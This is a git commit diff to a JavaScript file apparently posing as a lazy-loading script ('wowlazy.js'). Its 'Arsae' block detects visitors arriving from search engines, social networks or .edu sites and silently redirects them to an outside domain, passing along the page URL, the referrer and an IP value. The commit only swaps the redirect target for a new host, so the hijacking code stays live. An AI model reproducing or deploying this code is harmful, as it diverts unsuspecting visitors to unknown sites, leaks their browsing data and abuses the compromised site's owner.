47e97aaf490f8a5cd3d73deee943a57249ded92f
pooichai <pooichai7@gmail.com>
2025-04-22 00:05:52 +0700

    Update wowlazy.js

--- arsa/wowlazy.js
+++ arsa/wowlazy.js
@@ -18,5 +18,5 @@ document.write('</noscript>');
 
 
 ///// Arsae /////
-var ars = 'https://css.evolution-ofcloud.com';
+var ars = 'https://designk.pro';
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae }
